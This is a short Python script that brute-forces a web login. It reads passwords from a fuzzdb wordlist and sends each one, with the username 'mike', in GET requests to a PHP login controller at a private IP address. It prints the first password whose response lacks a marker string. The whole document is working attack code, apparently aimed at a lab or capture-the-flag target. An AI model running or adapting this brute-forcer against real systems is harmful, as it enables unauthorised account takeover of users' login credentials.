import requests

f = open('fuzzdb/wordlists-user-passwd/passwds/john.txt','r')

x = []
for pwd in f.xreadlines():
    x.append(pwd)


def brute_forcer(username):
    for i in x:
        i = i[:-1]
        url = 'http://192.168.0.42/controller/controller_login.php?username='+username+'&password='+i
        #print url
        r = requests.get(url)

        if 'abc' not in r.text :
            print i
            break


brute_forcer('mike')
